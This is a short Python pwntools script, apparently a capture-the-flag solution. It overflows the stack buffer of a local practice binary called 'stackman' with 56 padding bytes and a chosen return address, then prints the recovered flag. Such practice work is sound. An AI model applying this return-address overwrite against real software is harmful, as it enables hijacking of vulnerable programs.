from pwn import *

r = process('./stackman')

payload = b'F' * 56 + p64(0x4012c3)
r.sendlineafter(b'> ', payload)

r.recvuntil(b'<3: ')
print(f'\nFlag --> {r.recvline().strip().decode()}\n')
